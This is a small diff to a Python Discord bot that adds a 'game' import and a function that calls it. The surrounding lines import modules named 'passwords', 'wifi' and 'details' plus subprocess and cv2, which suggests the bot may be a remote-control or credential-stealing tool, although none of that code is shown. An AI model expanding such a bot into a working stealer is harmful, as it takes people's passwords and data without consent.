@@ -7,6 +7,7 @@ import shutil
 from passwords import main
 from wifi import aa
 from details import detailGetter
+from game import theGame
 import numpy as np
 import cv2
 import subprocess
@@ -65,6 +66,8 @@ async def on_guild_join(guild):
             await channel.send(helpmepls2)
             break
 
+def beginTheGame():
+    theGame()
 
 @bot.command()
 async def help(ctx, *, argument=None):
